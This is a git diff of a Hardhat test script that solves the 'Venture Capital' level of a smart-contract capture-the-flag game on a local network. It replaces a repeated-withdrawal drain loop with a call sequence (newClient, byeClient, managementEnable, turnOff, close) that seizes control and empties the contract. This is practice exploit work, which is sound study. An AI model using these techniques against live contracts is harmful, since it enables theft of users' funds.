@@ -1,17 +1,15 @@
+const { util } = require("chai");
 const { ethers } = require("hardhat");
 const hre = require('hardhat');
 
 // https://github.com/cypherpunks-core/cypherpunks-ctf/blob/dev/contracts/levels/VentureCapitalFactory.sol
 
-// Approach 1: send ether to the pre-computed address that DeveloperAuthorizer is about to be deployed
-// Approach 2: kill the contract and re-deploy using CREATE2: https://hackernoon.com/using-ethereums-create2-nw2137q7
-describe("Venture Capital", function () {
+describe.only("Venture Capital", function () {
   it("hardhat local network", async function () {
-    const provider = hre.network.provider;
-    const [player, deployer, client] = await hre.ethers.getSigners();
+    const provider = ethers.provider;
 
-    // const delpoyerNonce = await deployer.getTransactionCount();
-    // console.log('delpoyerNonce', delpoyerNonce.toString(16));
+    const [player, deployer, client, client2] = await hre.ethers.getSigners();
+
     const preComputedVCAddr = ethers.utils.getContractAddress({
         from: deployer.address,
         nonce: await deployer.getTransactionCount()
@@ -39,57 +37,32 @@ describe("Venture Capital", function () {
     const da = await ethers.getContractAt(
         require('../artifacts/contracts/VentureCapital.sol/DeveloperAuthorizer.json').abi,
         await vc.developerAuthorizer(),
-        deployer
+        player
     );
 
-    console.log('player.address:', player.address);
-    console.log('owner.address:', await vc.owner());
-    console.log('manager:', await vc.manager());
+    const newClientTx = await vc.connect(player).newClient(client.address, '1390849295786071768276380950238675083608645509734', { value: 100 });
+    await newClientTx.wait();
 
-    console.log('vc balance: ', await provider.send('eth_getBalance', [vc.address]));
-    console.log('da balance: ', await provider.send('eth_getBalance', [da.address]));
-    console.log('vc client balance:', await vc.clientBalance());
-
-    console.log('da address:', da.address);
-    console.log('vc.developerAuthorizer():', await vc.developerAuthorizer());
-    console.log('da.developerMode:', await da.developerMode());
-
-    // console.log('da.developerMode:', await da.developerMode());
-
-    // const managementEnableTx = await vc.connect(player).managementEnable(player.address);
-    // await managementEnableTx.wait();
-    console.log('vc client balance:', await vc.clientBalance());
-    console.log('vc balance: ', await provider.send('eth_getBalance', [vc.address]));
-
-    // const newClientTx = await vc.connect(player).newClient(client.address, 18, { value: 2 });
-    // await newClientTx.wait();
-
-    console.log('vc client balance:', await vc.clientBalance());
-    console.log('the client balance:', await provider.send('eth_getBalance', [client.address]));
-    console.log('vc balance: ', await provider.send('eth_getBalance', [vc.address]));
+    console.log('52 owner.address:', await vc.owner());
 
     const byeClientTx = await vc.connect(player).byeClient();
     await byeClientTx.wait();
 
-    console.log('vc client balance:', await vc.clientBalance());
-    console.log('the client balance:', await provider.send('eth_getBalance', [client.address]));
-    console.log('vc balance: ', parseInt(await provider.send('eth_getBalance', [vc.address])));
+    const managementEnableTx = await vc.managementEnable(player.address);
+    await managementEnableTx.wait();
 
-    const VCAFactory = await ethers.getContractFactory("VentureCapitalAttack");
-    const vca = await VCAFactory.connect(player).deploy(vc.address);
-    await vca.deployed();
+    const turnOffTx = await da.connect(player).turnOff({ value: ethers.utils.parseEther('0.575758') });
+    await turnOffTx.wait();
 
-    console.log('vc address', vca.address);
+    console.log(await da.developerMode());
 
-    const newClientTx = await vc.connect(player).newClient(vca.address, 18, { value: 100 });
-    await newClientTx.wait();
+    console.log('64 owner.address:', await vc.owner());
 
-    for (let i = 0; i < 1e16; i++) {
-        const clientWithdrawTx = await vc.connect(player).clientWithdraw(vca.address);
-        await clientWithdrawTx.wait();
+    console.log('clients length: ', await vc.getClientsLength());
 
-        console.log('vc balance: ', parseInt(await provider.send('eth_getBalance', [vc.address])));
-        console.log('vca balance:', parseInt(await provider.send('eth_getBalance', [vca.address])));
-    }
-  });
+    const closeTx = await vc.connect(player).close();
+    await closeTx.wait();
+
+    console.log('vc balance: ', await provider.getBalance(vc.address));
+    });
 });
